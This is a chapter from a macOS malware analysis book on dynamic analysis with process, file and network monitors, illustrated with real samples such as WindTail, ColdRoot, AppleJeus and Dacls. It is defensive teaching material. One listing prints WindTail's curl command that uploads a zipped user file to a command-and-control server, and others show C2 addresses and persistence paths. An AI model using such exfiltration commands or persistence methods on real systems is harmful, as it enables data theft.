<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 7: Dynamic Analysis Tools</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_149" title="149"/>7</span><br/>
<span class="ChapterTitle">Dynamic Analysis Tools</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">In the previous chapters, we discussed methods of static analysis used to examine files without actually running them. Often, however, it may be more efficient to simply execute a malicious file to passively observe its behavior and actions. This is especially true when malware authors have implemented mechanisms designed specifically to complicate or even thwart static analysis, such as encrypting embedded strings and configuration information or dynamically loading more code at runtime. </p>
<p>WindTail provides an illustrative example. The addresses of its command and control servers (generally something a malware analyst would seek to uncover) are embedded directly within the malware but encrypted. It is possible to manually decode these encrypted addresses, as the encryption key is hardcoded within the malware. However, it is far easier to simply execute the malware. Then, using a dynamic analysis tool such as a network <span epub:type="pagebreak" id="Page_150" title="150"/>monitor, we can passively uncover the addresses of the servers when the malware attempts to establish a connection. </p>
<p>In this chapter we will dive into several dynamic analysis methods useful for passively observing Mac malware specimens, including process, file, and network monitoring. We’ll also discuss the tools you can use to perform this monitoring. Malware analysts often use these tools to quickly gain insight into the capabilities of a malicious specimen. Later, this information can become part of detection signatures for identifying other infections. In <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span> we’ll explore the advanced dynamic analysis techniques of debugging.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">Note</span></h2>
<p>	In this section of the book, we’ll discuss methods of dynamic analysis that involve executing the malware to observe its actions. <em>Always</em> perform such analysis in a compartmented virtual machine or, better yet, on a dedicated malware analysis machine. In other words, don’t perform dynamic analysis on your main system! For a detailed guide to setting up a virtual machine for macOS malware analysis, see “<a class="LinkURL" href="https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-one/">How to Reverse Malware on macOS Without Getting Infected</a>.”<sup class="endnote"><a href="#c07-endnote-1" id="c07-noteref-1">1</a></sup></p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h2 id="h1-501942c07-0001">Process Monitoring</h2>
<p class="BodyFirst">Malware will often execute additional processes to perform tasks on its behalf, and observing the execution of these processes via a process monitor can provide valuable insight into the malware’s behavior and capabilities. Often, these processes are simply command line utilities, built into macOS, that the malware executes in order to lazily delegate required actions. For example, a malicious installer might invoke macOS’s move (<em>/bin/mv</em>) or copy (<em>/bin/cp</em>) utilities to persistently install the malware. To survey the system, the malware might invoke the process status (<em>/bin/ps</em>) utility to get a list of running processes, or the <code>whoami</code> (<em>/usr/bin/whoami</em>) utility to determine the current user’s permissions. It might then exfiltrate the results of this survey to a remote command and control server via <em>/usr/bin/curl</em>. By passively observing the execution of these commands, we can efficiently understand the malware’s interactions with the system.</p>
<p>Malware may also spawn binaries that have been packaged together with the original malware sample or that it dynamically downloads from a remote command and control server. For example, malware called Eleanor deploys with several utilities to extend the malware’s functionality. It is prebundled with Netcat, a well-known networking utility; Wacaw, a simple open source command line tool capable of capturing pictures and video from the built-in webcam; and a Tor utility to facilitate anonymous network communications. We could use a process monitor to observe the malware executing these packaged utilities to uncover its ultimate goal, which in this case is setting up a Tor-based backdoor able to fully interact with the infected system and remotely spy on users. </p>
<p>It is important to note that the binaries packaged in Eleanor are not malicious per se. Instead, the utilities provide functionality (for example, webcam recording) that the malware author wanted to incorporate into the malware but was likely too time-constrained or too unskilled to write <span epub:type="pagebreak" id="Page_151" title="151"/>themselves, or perhaps simply saw as an efficient approach to achieving this desired functionality. </p>
<p>Another example of a malware specimen that is packaged with an embedded binary is FruitFly. Because FruitFly was written in Perl, it has limited ability to perform low-level actions such as generating synthetic mouse and keyboard events (for example, in an attempt to dismiss security prompts). To address this shortcoming, the author packaged it with an embedded Mach-O binary capable of performing these actions. In this case, using a process monitor could allow us to observe the malware writing out this embedded binary to disk before launching it. We could then capture a copy of the binary for analysis before the task completes and the malware removes it. </p>
<h3 id="h2-501942c07-0001">The ProcessMonitor Utility</h3>
<p class="BodyFirst">In addition to displaying the process identifier and path of spawned processes, more comprehensive process monitors can also provide information such as a process hierarchy, command line arguments, and code-signing information. Of this additional information, the process arguments are especially valuable to malware analysis, because they can often reveal the exact actions the malware is delegating. </p>
<p>Unfortunately, macOS does not provide a built-in process monitoring utility that includes these features. But not to worry, I’ve created an open source one (uncreatively named <em>ProcessMonitor</em>) that leverages Apple’s powerful Endpoint Security framework to facilitate the dynamic analysis of Mac malware. ProcessMonitor will display process events, like <code>exec</code>, <code>fork</code>, and <code>exit</code>, along with the process’s ID (<code>pid</code>), full path, and any command line arguments. The tool also reports any code-signing information and a full process hierarchy. To capture process events, ProcessMonitor must be run with root privileges in macOS’s terminal. Moreover, the terminal must be granted full disk access via the Security &amp; Privacy pane in the System Preferences application. For more information about the tool and its prerequisites, see ProcessMonitor’s documentation<span class="Underline">.</span><sup class="endnote"><a href="#c07-endnote-2" id="c07-noteref-2">2</a></sup></p>
<p>Let’s briefly look at some abridged output from ProcessMonitor as it observes processes spawned by an installer of a variant of Lazarus Group’s AppleJeus malware. To instruct ProcessMonitor to output formatted JSON, we execute it with the <code>-pretty</code> flag (<a href="#listing7-1" id="listinganchor7-1">Listing 7-1</a>):</p>
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>  "process" : {<br/>    "arguments" : [<br/>      "mv",<br/>      "/Applications/UnionCryptoTrader.app/Contents/<br/>                     Resources/.vip.unioncrypto.plist",<br/>      "/Library/LaunchDaemons/vip.unioncrypto.plist"<br/>    ],<br/>    "path" : "/bin/mv",<br/>    "pid" : 3458,<br/><span epub:type="pagebreak" id="Page_152" title="152"/>    "ppid" : 3457<br/>  }<br/>}<br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>  "process" : {<br/>    "arguments" : [<br/>      "mv",<br/>      "/Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater",<br/>      "/Library/UnionCrypto/unioncryptoupdater"<br/>    ],<br/>    "path" : "/bin/mv",<br/>    "pid" : 3461,<br/>    "ppid" : 3457 <br/>  }<br/>}<br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>  "process" : {<br/>    "arguments" : [<br/>      "/Library/UnionCrypto/unioncryptoupdater"<br/>    ],<br/>    "path" : "/Library/UnionCrypto/unioncryptoupdater",<br/>    "pid" : 3463,<br/>    "ppid" : 3457<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing7-1">Listing 7-1</a>: Using ProcessMonitor to observe installer commands (AppleJeus variant)</p>
<p>From these processes and their arguments, we observe the malicious installer doing the following: executing the built-in <em>/bin/mv</em> utility to move a hidden property list from the installer’s <em>Resources/</em> directory into <em>/Library/LaunchDaemons</em> <span aria-label="annotation1" class="CodeAnnotation">1</span>, executing <em>/bin/mv </em>to move a hidden binary from the installer’s <em>Resources/</em> directory into <em>/Library/UnionCrypto/</em> <span aria-label="annotation2" class="CodeAnnotation">2</span>, and then launching this binary, <code>unioncryptoupdater</code> <span aria-label="annotation3" class="CodeAnnotation">3</span>. Solely from a process monitor, we now know that the malware persists as a launch daemon, <em>vip.unioncrypto.plist,</em> and we identified the binary, <em>unioncryptoupdater</em>, that serves as the malware’s persistent backdoor component. </p>
<p>Process monitoring can also shed light on a malicious sample’s core functionality. For example, WindTail’s main purpose is to collect and exfiltrate files from an infected system. While we can discover this using static analysis methods such as disassembling the malware’s binary, it’s far simpler to leverage a process monitor. <a href="#listing7-2" id="listinganchor7-2">Listing 7-2</a> contains abridged output from ProcessMonitor. </p>
<pre><code># <b>ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>  "process" : {<br/>    "pid" : 1202,<br/>    "path" : "/usr/bin/zip",<br/>    "arguments" : [<br/><span epub:type="pagebreak" id="Page_153" title="153"/>      "/usr/bin/zip",<br/>      "/tmp/secrets.txt.zip",<br/>      "/Users/user/Desktop/secrets.txt"<br/>    ], <br/>    "ppid" : 1173 <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/>  }<br/>}<br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>  "process" : {<br/>    "pid" : 1258,<br/>    "path" : "/usr/bin/curl",<br/>    "arguments" : [<br/>      "/usr/bin/curl",<br/>      "-F",<br/>      "vast=@/tmp/secrets.txt.zip",<br/>      "-F",<br/>      "od=1601201920543863",<br/>      "-F",<br/>      "kl=users-mac.lan-user",<br/>      "string2me.com/.../kESklNvxsNZQcPl.php" <span aria-label="annotation4" class="CodeAnnotationCode">4</span><br/>    ],<br/>    "ppid" : 1173<br/>  }<br/>}<br/>% ps -p 1173 <br/>  PID TTY     TIME      CMD<br/>  1173 ??     0:00.38   ~/Library/Final_Presentation.app/Contents/MacOS/usrnode <span aria-label="annotation5" class="CodeAnnotationCode">5</span></code></pre>
<p class="CodeListingCaption"><a id="listing7-2">Listing 7-2</a>: Using ProcessMonitor to uncover file exfiltration functionality (WindTail)</p>
<p>In the ProcessMonitor output, we see the malware first creating a ZIP archive of a file to collect <span aria-label="annotation1" class="CodeAnnotation">1</span> before exfiltrating the archive using the <code>curl</code> command <span aria-label="annotation3" class="CodeAnnotation">3</span>. As an added bonus, the command line options passed to <code>curl</code> reveal the malware’s exfiltration server, string2me.com <span aria-label="annotation4" class="CodeAnnotation">4</span>. The reported parent process identifier (<code>ppid</code>) provides a way to correlate child processes to a parent. For example, we leverage the <code>ps</code> utility to map the reported <code>ppid</code> (1173) <span aria-label="annotation2" class="CodeAnnotation">2</span> to WindTail’s persistent component, <em>Final_Presentation.app/Contents/MacOS/usrnode </em><span aria-label="annotation5" class="CodeAnnotation">5</span>.</p>
<p>Though process monitoring can passively and efficiently provide us with invaluable information, it is only one component of a comprehensive dynamic analysis approach. In the next section, we’ll cover file monitoring, which can provide complementary insight into the malware’s actions. </p>
<h2 id="h1-501942c07-0002">File Monitoring</h2>
<p class="BodyFirst"><em>File monitoring</em> is passively watching a host’s filesystem for events of interest. During the infection process, as well as during the execution of the payload, the malware will likely access the filesystem and manipulate it in a variety of ways, such as by saving scripts or Mach-O binaries to disk, creating a mechanism such as a launch item for persistence, and accessing user documents, perhaps for exfiltration to a remote server.</p>
<p><span epub:type="pagebreak" id="Page_154" title="154"/>Although we can sometimes indirectly observe this access with a process monitor when the malware delegates actions to system utilities, more sophisticated malware may be fully self-contained and won’t spawn any additional processes. In this case, a process monitor may be of little help. Regardless of the malware’s sophistication, we can often observe the malware’s actions via a file monitor instead. </p>
<h3 id="h2-501942c07-0002">The fs_usage Utility</h3>
<p class="BodyFirst">We can monitor the filesystem using macOS’s built-in file monitoring utility <code>fs_usage</code>. To capture filesystem events with elevated permissions, execute <code>fs_usage</code> with the <code>-f filesystem</code> flags. Specify the <code>-w</code> command line option to instruct <code>fs_usage</code> to provide more detailed output. Also, the output of <code>fs_usage </code>should be filtered; otherwise, the amount of system file activity can be overwhelming. To do so, either specify the target process (<code>fs_usage -w -f filesystem malware.sample</code>) or pipe the output to <code>grep</code>. </p>
<p>For example, if we execute the Mac malware called ColdRoot while <code>fs_usage</code> is running, we will observe it accessing a file named <em>conx.wol</em> found within its application bundle (<a href="#listing7-3" id="listinganchor7-3">Listing 7-3</a>):</p>
<pre><code># <b>fs_usage -w -f filesystem</b> <br/>  access   (___F)   com.apple.audio.driver.app/Contents/MacOS/conx.wol<br/>  open     F=3      (R_____)  com.apple.audio.driver.app/Contents/MacOS/conx.wol<br/>  flock    F=3      <br/>  read     F=3      B=0x92<br/>  close    F=3</code></pre>
<p class="CodeListingCaption"><a id="listing7-3">Listing 7-3</a>: Using <code>fs_usage</code> to observe file accesses (ColdRoot)</p>
<p>As you can see, the malware, named <em>com.apple.audio.driver.app</em>, opens and reads the contents of the file. Let’s take a peek at this file to see if it can shed details about the malware’s functionality (<a href="#listing7-4" id="listinganchor7-4">Listing 7-4</a>):</p>
<pre><code>%<b> cat com.apple.audio.driver.app/Contents/MacOS/conx.wol</b><br/>{<br/>    "PO": 80,<br/>    "HO": "45.77.49.118",<br/>    "MU": "CRHHrHQuw JOlybkgerD",<br/>    "VN": "Mac_Vic",<br/>    "LN": "adobe_logs.log",<br/>    "KL": true,<br/>    "RN": true,<br/>    "PN": "com.apple.audio.driver"<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing7-4">Listing 7-4</a>: Configuration file (ColdRoot)</p>
<p>The contents of this file suggest that <em>conx.wol</em> is a configuration file for the malware. Among other values, it contains the port and IP address of the attacker’s command and control server. To figure out what the other key/value pairs represent, we could hop into a disassembler and look for a cross-reference to the string <code>"conx.wol"</code>. (Alternatively, we could do this in a <span epub:type="pagebreak" id="Page_155" title="155"/>debugger, which we’ll discuss in <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span>.) Doing so would lead us to logic in the malware’s code that parses and acts upon the key/value pairs in the file. I’ll leave this as an exercise for the interested reader.</p>
<p>The <code>fs_usage</code> utility is convenient because it’s baked into macOS. However, as a basic file-monitoring tool, it leaves much to be desired. Most notably, it does not provide detailed information about the process responsible for the file event, such as arguments or code-signing information.  </p>
<h3 id="h2-501942c07-0003">The FileMonitor Utility</h3>
<p class="BodyFirst">To address these shortcomings, I created the open source FileMonitor utility.<sup class="endnote"><a href="#c07-endnote-3" id="c07-noteref-3">3</a></sup> Similar to the aforementioned ProcessMonitor utility, it leverages Apple’s Endpoint Security framework and is designed with malware analysis in mind. Via FileMonitor we can receive valuable details about real-time file events. Note that, like ProcessMonitor, FileMonitor must be run as root in a terminal that has been granted full disk access. </p>
<p>As an example, let’s see how FileMonitor can easily reveal the details of the BirdMiner malware’s persistence (<a href="#listing7-5" id="listinganchor7-5">Listing 7-5</a>). BirdMiner delivers a Linux-based cryptominer that is able to run on macOS due to the inclusion of a QEMU emulator in the malware’s disk image. When the infected disk image is mounted and the application installer is executed, it will first request the user’s credentials. Once it has root privileges, it will persistently install itself. To see how, take a look at the output from FileMonitor. Note that this output is abridged to improve readability. For instance, it does not contain the process’s code-signing information.  </p>
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty</b><br/>{<br/><span aria-label="annotation1" class="CodeAnnotationCode2">1</span> "event": "ES_EVENT_TYPE_NOTIFY_CREATE",<br/>  "file": {<br/>    "destination": "/Library/LaunchDaemons/com.decker.plist",<br/>    "process": {<br/>      "pid": 1073,<br/>      "path": "/bin/cp",<br/>      "ppid": 1000<br/>    }<br/>  }<br/>}<br/>{<br/><span aria-label="annotation2" class="CodeAnnotationCode2">2</span> "event": "ES_EVENT_TYPE_NOTIFY_CREATE",<br/>  "file": {<br/>    "destination": "/Library/LaunchDaemons/com.tractableness.plist",<br/>    "process": {<br/>      "pid": 1077,<br/>      "path": "/bin/cp",<br/>      "ppid": 1000,<br/>    }<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing7-5">Listing 7-5</a>: Using FileMonitor to uncover persistence (BirdMiner)</p>
<p><span epub:type="pagebreak" id="Page_156" title="156"/>From the FileMonitor output, we can see that the malware (<code>pid 1000</code>) has spawned the <em>/bin/cp</em> utility to create two files that turn out to be BirdMiner’s two persistent launch daemons: <em>com.decker.plist</em> <span aria-label="annotation1" class="CodeAnnotation">1</span> and <em>com.tractableness.plist</em> <span aria-label="annotation2" class="CodeAnnotation">2</span>.</p>
<p>FileMonitor is particularly useful for uncovering the functionality of malware that spawns no additional processes. For instance, the installer for the Yort malware directly drops a persistent backdoor (<a href="#listing7-6" id="listinganchor7-6">Listing 7-6</a>). As it does not execute any other external processes to assist with this persistence, a process monitor would not observe the event. On the other hand, the FileMonitor output shows the creation of this backdoor, <code>.FlashUpdateCheck</code>, as well as the process responsible for the creation of the malicious backdoor. (Yort’s installer masquerades as an Adobe Flash Player application, which we focus on via the <code>-filter</code> command line flag.) As FileMonitor also includes the process’s code-signing information (or lack thereof), we can also see that the malicious installer is unsigned. </p>
<pre><code> #<b> </b><b>FileMonitor.app/Contents/MacOS/FileMonitor -filter "Flash Player" -pretty</b><br/>{<br/>  "event" : "ES_EVENT_TYPE_NOTIFY_WRITE",<br/>  "file" : {<br/>    "destination" : "~/.FlashUpdateCheck",<br/>    "process" : {<br/>      "signing info" : {<br/>        "csFlags" : 0,<br/>        "isPlatformBinary" : 0,<br/>        "cdHash" : "00000000000000000000"<br/>      },<br/>      "path" : "~/Desktop/Album.app/Contents/MacOS/Flash Player",<br/>      "pid" : 1031<br/>    }<br/>  }<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing7-6">Listing 7-6</a>: Using FileMonitor to uncover a persistent backdoor component (Yort)</p>
<p>Given that a file monitor utility can provide most of the information captured by a process monitor, you may be wondering why you need a process monitor at all. One answer is that certain information, such as process arguments, are generally only reported by a process monitor. Moreover, file monitors report on the entire system’s file activity when run in their default state, often providing too much irrelevant information. This can be overwhelming, especially during the initial stage of your analysis. While you can filter file monitors (for example, FileMonitor supports the <code>-filter</code> flag), doing so requires knowledge of what to filter on. In contrast, process monitors may provide a more succinct overview of a malicious sample’s actions, which in turn can guide the filtering you apply to the file monitor. Thus, it’s generally wise to start by using a process monitor to observe the commands or child processes a malicious specimen may spawn. If you need more details, or if the information from the process monitor proves insufficient, fire up a file monitor. At that point, you can filter the output based on values like the name of the malware and any processes it spawns, to keep the output at a reasonable level. </p>
<h2 id="h1-501942c07-0003"><span epub:type="pagebreak" id="Page_157" title="157"/>Network Monitoring</h2>
<p class="BodyFirst">Most Mac malware specimens contain network capabilities. For example, they might interact with a remote command and control server, open a listening socket to await a remote attacker connection, or even scan for additional systems to infect. Command and control server interactions are particularly common, as they allow malware to download additional payloads, receive commands, or exfiltrate user data. For instance, the installer for the malware known as CookieMiner downloads property lists for persistence, as well as a cryptocurrency miner. Once persistently installed, the malware exfiltrates passwords and authentication cookies that allow attackers to gain access to users’ accounts. </p>
<p>The malware will always contain the address of the command and control server, either as a domain name or an IP address, embedded within its binary or a configuration file, though it may be obfuscated or encrypted. One of our main goals when analyzing malicious samples is to figure out how they interact with the network. This involves uncovering network endpoints, like the addresses of any command and control servers, as well as details about any malicious network traffic, such as tasking and data exfiltration. It’s also wise to look for listening sockets that the malware may have opened in order to provide backdoor access to a remote attacker.</p>
<p>In addition to revealing the malware’s capabilities, this information enables us to take defensive actions such as developing network-level indicators of compromise or even working with external entities to take the command and control server offline, thwarting the spread of infections. </p>
<p>Statically analyzing a malicious sample can reveal its network capabilities and endpoints, but using a network monitor is often a far simpler approach. To illustrate this, let’s return to the example mentioned at the beginning of this chapter. Recall that the addresses of WindTail’s command and control servers were embedded directly within its binary, but they were encrypted in an attempt to thwart manual static analysis efforts. <a href="#listing7-7" id="listinganchor7-7">Listing 7-7</a> is a snippet of decompiled code from WindTail that decodes and decrypts the address of a command and control server.</p>
<pre><code><span aria-label="annotation1" class="CodeAnnotationHang">1</span> r14 = [NSString stringWithFormat:@"%@", [self yoop:@"F5Ur0CCFMO/... OLs="]];<br/><br/>rbx = [[NSMutableURLRequest alloc] init];<br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> [rbx setURL:[NSURL URLWithString:r14]];<br/><br/>[[NSString alloc] initWithData:[NSURLConnection sendSynchronousRequest:rbx <br/> <span aria-label="annotation3" class="CodeAnnotationCode">3</span> returningResponse:0x0 error:0x0] encoding:0x4];</code></pre>
<p class="CodeListingCaption"><a id="listing7-7">Listing 7-7</a>: Embedded command and control server, encrypted to thwart static analysis efforts (WindTail)</p>
<p>This address <span aria-label="annotation1" class="CodeAnnotation">1</span> (stored in the <code>R14</code> register) is used to create a URL object (stored in <code>RBX</code>) <span aria-label="annotation2" class="CodeAnnotation">2</span>, to which the malware sends a request <span aria-label="annotation3" class="CodeAnnotation">3</span>. The encryption and encoding are intended to complicate static analysis efforts, but armed with a network monitor, we can easily recover the address of this server. Specifically, we can execute the malware in a virtual machine while <span epub:type="pagebreak" id="Page_158" title="158"/>monitoring network traffic. Almost immediately, the malware connects to its server, revealing its address, <em>flux2key.com</em> (<a href="#figure7-1" id="figureanchor7-1">Figure 7-1</a>).</p>
<figure>
<img alt="Screenshot of a Wireshark interface showing information on WindTail as follows: “Host: flux2key.com,” “Accept: */*,” “Accept-Language: en-us,” “Connection: keep-alive,” and “Accept-Encoding: gzip, deflate.”" class="keyline" src="image_fi/501942c07/f07001.png"/>
<figcaption><p><a id="figure7-1">Figure 7-1</a>: A network monitor reveals the address of a command and control server (WindTail)</p></figcaption>
</figure>
<p>You can sometimes discover network endpoints using a process monitor alone if the malware delegates its network activities to system utilities. However, a dedicated network monitoring tool will be able to observe any network activity, even for self-contained malware like WindTail. Moreover, a network monitor may be able to capture packets, providing valuable insight into a malware specimen’s protocol and file exfiltration capabilities.</p>
<p>Broadly speaking, there are two types of network monitors. The first type provides a snapshot of current network use, including any established connections. Examples of these include <code>netstat</code>, <code>nettop</code>, <code>lsof</code>, and Netiquette.<sup class="endnote"><a href="#c07-endnote-4" id="c07-noteref-4">4</a></sup> The second type provides packet captures of network streams. Examples of these include <code>tcpdump</code> and Wireshark.<sup class="endnote"><a href="#c07-endnote-5" id="c07-noteref-5">5</a></sup> Both types are useful tools for dynamic malware analysis.</p>
<h3 id="h2-501942c07-0004">macOS’s Network Status Monitors</h3>
<p class="BodyFirst">Various network utilities, including several that are built into macOS, can provide information about the current status and utilization of the network. For example, they can report on established connections (perhaps to a command and control server) and listening sockets (perhaps interactive backdoors awaiting an attacker’s connection), along with the responsible process. Each of these utilities supports a myriad of command line flags that control their use and format or filter their output. Consult their man pages for information on these various flags.</p>
<p>The most well-known is <code>netstat</code>, which shows the status of the network. When executed with the <code>-a</code> and <code>-v</code> command line flags, it will show a verbose listing of all sockets, including their local and remote addresses, state (such as established or listening), and the process responsible for the event.  Also of note is the <code>-n</code> flag, which can speed up the network state enumeration by preventing the resolution of IP addresses to their corresponding domain names. </p>
<p>A more dynamic utility is macOS’s <code>nettop</code>, which refreshes automatically to show current information about the network. Besides providing socket information, such as local and remote addresses, states, and the process responsible for the event, it also provides high-level statistics, such as the number of bytes transmitted. Once <code>nettop</code> is running, you can collapse and expand its output with the <span class="KeyCaps">c</span> and <span class="KeyCaps">e</span> keys, respectively. </p>
<p><span epub:type="pagebreak" id="Page_159" title="159"/>The <code>lsof</code> utility simply lists open files, and on macOS these include sockets. Execute it as root for a system-wide listing and with the <code>-i</code> command line flag to limit its output to network-related files (sockets). This will provide socket information, such as local and remote addresses, states, and the process responsible for the event. </p>
<p>To see how the <code>lsof</code> utility can be useful, let’s use it to examine a Mac malware specimen. In mid-2019, attackers targeted macOS users with a Firefox zero-day to install malware known as Mokes. Analysis of this sample aimed to recover the address of the malware’s command and control server. Using a network monitor, this turned out to be fairly straightforward. After observing the malware’s installer persisting a binary named <em>quicklookd</em> in the <em>~/Library/Dropbox</em> directory, <code>lsof</code> (executed with the <code>-i</code> and <code>TCP</code> flags to filter on TCP connections) revealed an outgoing connection to <code>185.49.69.210</code> on port <code>80</code>, commonly used for HTTP traffic. As seen in the abridged output in <a href="#listing7-8" id="listinganchor7-8">Listing 7-8</a>, <code>lsof</code> attributed this connection to Mokes’s malicious <code>quicklookd</code> process:</p>
<pre><code>% <b>lsof -i TCP</b><br/>COMMAND     PID  USER  TYPE      NAME<br/>quicklookd  733  user  IPv4 TCP  192.168.0.128:49291-&gt;185.49.69.210:http (SYN<br/>_                                                                        SENT)<br/><br/>% <b>ps -p 733</b> <br/>PID  TTY  CMD<br/>733  ??   ~/Library/Dropbox/quicklookd </code></pre>
<p class="CodeListingCaption"><a id="listing7-8">Listing 7-8</a>: Using <code>lsof</code> to uncover the address of a command and control server (Mokes)</p>
<h3 id="h2-501942c07-0005">The Netiquette Utility</h3>
<p class="BodyFirst">In order to supplement the built-in command line utilities, I created the open source Netiquette tool. <em>Netiquette</em> makes use of Apple’s private Network Statistics framework to provide a simple GUI with various options designed to facilitate malware analysis. For example, you can instruct it to ignore system processes, filter on user-specified input (like selecting Listen to only display sockets in the Listen state), and export its results to JSON. </p>
<p>Let’s look at an example in which Netiquette quickly revealed a sophisticated malware specimen’s remote server. In mid-2020, the Lazarus Group targeted macOS users with malware known as Dacls. Executing the malware results in an observable networking event: a connection attempt on port <code>443</code> (commonly used for HTTPS traffic) to the attacker’s remote server, found at <code>185.62.58.207</code>. As you can see in <a href="#figure7-2" id="figureanchor7-2">Figure 7-2</a>, Netiquette easily detects this connection and attributes it to a process backed by a hidden file (<em>.mina</em>) in the user’s <em>~/Library</em> directory. This process is the malware’s persistent component.</p>
<p>It is worth noting that Dacls will attempt to connect to multiple command and control servers, so when you execute the malware multiple times, a variety of connection attempts should appear in a network monitor. This is yet another example of why you’ll find it useful to combine static and <span epub:type="pagebreak" id="Page_160" title="160"/>dynamic analysis techniques. Dynamic analysis can quickly identify a primary command and control server, while static analysis could uncover the addresses of additional backup servers.</p>
<figure>
<img alt="Screenshot of the Netiquette interface showing that Dacls’s server from the “.mina (pid: 747)” file is located at address 185.62.58.207:443,” to which it connected using the Protocol “TCP,” Interface “en0,” and State “SynSent.”" class="keyline" src="image_fi/501942c07/f07002.png"/>
<figcaption><p><a id="figure7-2">Figure 7-2</a>: Using Netiquette to uncover the address of a command and control server (Dacls)</p></figcaption>
</figure>
<h3 id="h2-501942c07-0006">Network Traffic Monitors</h3>
<p class="BodyFirst">Certain network monitors capture actual network traffic, in the form of packets, for in-depth analysis. As malware analysts, we’re interested not just in the addresses of the command and control servers but also the actual contents of the packets. This content can shed insight into the capabilities of the malware. Examples of network traffic monitors include the ubiquitous <code>tcpdump</code> utility and the well-known <a class="LinkURL" href="https://www.wireshark.org/">Wireshark</a> application. </p>
<p>When run from the terminal, <code>tcpdump</code> will continually display a stream of network packets (often called a <em>dump</em>), and we can use Boolean expressions to filter this stream. The <code>tcpdump</code> utility also supports many command line options, such as <code>-A</code> to print captured packets in ASCII and the <code>host</code> and <code>port</code> options to capture only specific connections, making it especially useful for analyzing the network traffic and understanding the protocol of malicious specimens. </p>
<p>For example, we can use <code>tcpdump</code> to observe that the malicious InstallCore malware, which masquerades as an Adobe Flash Player installer, does in fact download and install a legitimate copy of Flash. Is this behavior odd? Not particularly, considering that the user tricked into running the malware is expecting Flash to be installed. In <a href="#listing7-9" id="listinganchor7-9">Listing 7-9</a>, the <code>-s0</code> flag instructs <code>tcpdump</code> to capture the entire packet, while <code>-A</code> will print out each packet in ASCII. Finally, we also specify that we’re only interested in traffic passing through the default Ethernet interface (<code>en0</code>) on port <code>80</code>. </p>
<pre><code># <b>tcpdump -s0 -A -i en0 port 80</b><br/>GET /adobe_flashplayer_e2c7b.dmg HTTP/1.1<br/>Host: appsstatic2fd4se5em.s3.amazonaws.com<br/>Accept: */*<br/>Accept-Language: en-us<br/>Connection: keep-alive<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: Installer/1 CFNetwork/720.3.13 Darwin/14.3.0 (x86_64)</code></pre>
<p class="CodeListingCaption"><a id="listing7-9">Listing 7-9</a>: Using <code>tcpdump</code> to observe downloads (InstallCore)</p>
<p><span epub:type="pagebreak" id="Page_161" title="161"/>Like the other networking utilities that ship with macOS, <code>tcpdump</code> supports many additional command line options. For example, you can use the <code>-n</code> flag to instruct it not to resolve names to addresses and the <code>-XX</code> flag to print additional information about the packet, including a hex dump of the data. The latter is especially useful when analyzing non-ASCII traffic.  </p>
<p>Another network monitor, Wireshark, provides a user interface and powerful protocol-decoding capabilities. To use it, specify the network interface from which you want to capture packets. (To capture from the primary physical network interface, select <code>en0</code>.) Wireshark will then begin its capture, which you can filter based on criteria like IP addresses, ports, and protocols. For example, say you’ve determined the remote address of a malware’s command and control server via static analysis, or dynamically with a tool like Netiquette. You can now apply a filter to only display packets sent to and from this server using the following syntax: </p>
<pre><code>ip.dst == <var>&lt;address of C&amp;C server&gt;</var> </code></pre>
<p><a href="#figure7-3" id="figureanchor7-3">Figure 7-3</a> shows a Wireshark capture of the survey data collected by malware known as ColdRoot. From this capture, we can easily determine what information the malware collects and transmits as it initially infects a system.</p>
<figure>
<img alt="Screenshot of the Wireshark interface showing the following fields: “{‘Ver’:1, ‘RAM’:0, ‘CAM’:false, ‘Serial’:‘x86_64\n’,’PCName’:‘user\n – user’, ‘OS’:‘Mac OS X10.13.2’, ‘ID’:‘Mac_Vic’, ‘AW’:‘N\/A’, ‘AV’:‘N\/A’}…”" class="keyline" src="image_fi/501942c07/f07003.png"/>
<figcaption><p><a id="figure7-3">Figure 7-3</a>: Using Wireshark to capture survey data (ColdRoot)</p></figcaption>
</figure>
<p>Likewise, remember that FruitFly was a rather insidious piece of Mac malware that remained undetected for over a decade. Once it was captured, network monitoring tools played a large role in its analysis. For example, via Wireshark we can observe the malware responding to the attacker’s command and control server with the location in which it has installed itself on the infected machine (<a href="#figure7-4" id="figureanchor7-4">Figure 7-4</a>).</p>
<span epub:type="pagebreak" id="Page_162" title="162"/><figure>
